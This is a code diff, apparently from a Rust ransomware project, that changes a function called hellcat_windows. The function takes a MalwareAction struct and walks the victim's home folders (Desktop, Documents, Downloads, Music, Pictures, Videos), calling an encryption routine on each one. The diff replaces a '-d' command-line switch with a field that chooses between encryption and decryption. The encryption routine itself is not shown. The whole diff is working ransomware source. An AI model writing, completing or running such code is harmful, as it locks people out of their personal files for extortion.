@@ -2,24 +2,20 @@ use dirs;
 
 // import encyrption module in ./encryption/enc.rs
 use crate::encryption::enc::{self};
+use crate::types::{MalwareAction};
 
-pub async fn hellcat_windows() {
+
+pub async fn hellcat_windows(actions:MalwareAction) {
     
     // get the home directory
     let home = dirs::home_dir().unwrap();
-    let home_str = home.to_str().unwrap();
+    let mut home_str = home.to_str().unwrap();
+
+    if actions.path != "_home" {
+        home_str = actions.path.as_str();
+    }
 
     println!("Home {}", home_str);
-
-    // get the args
-    let mut decrypt:bool = false;
-
-    // check if argument is present
-    for argument in std::env::args() {
-        if argument == "-d" {
-            decrypt = true;
-        }
-    }
 
     // array of home dir with: Desktop, Documents, Downloads, Music, Puctures, Videos
     let intresting_folder = [
@@ -35,6 +31,11 @@ pub async fn hellcat_windows() {
         // start encryption
         let full_path = home_str.to_string() + "\\" + f;
         println!("Encrypting: {}", full_path);
-        enc::encryption(full_path.as_str(), decrypt);
+
+        if actions.encrypt {
+            enc::encryption(full_path.as_str(), false);
+        } else {
+            enc::encryption(full_path.as_str(), true);
+        }
     }
 }
